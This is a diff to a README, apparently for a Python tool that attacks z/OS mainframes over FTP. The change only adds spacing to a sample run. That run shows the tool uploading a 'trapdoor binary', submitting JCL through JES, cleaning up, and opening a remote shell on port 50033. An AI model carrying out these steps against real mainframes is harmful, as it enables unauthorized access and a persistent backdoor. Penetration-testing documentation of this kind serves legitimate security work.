@@ -13,10 +13,18 @@ A python script which takes a hostname/ip address of a z/OS FTP server, a userna
 ## Together
 
 [+] Connecting to: mainframe.company.com : 21
+
 [+] Uploading trapdoor binary
+
 [+] Switching to JES mode
+
 [+] Inserting JCL in to job queue
+
 [+] Cleaning up...
+
 [+] Connecting Shell on port 50033 .....Done!
+
 id
+
 uid=31337(CASE) gid=0(GRP1)
+
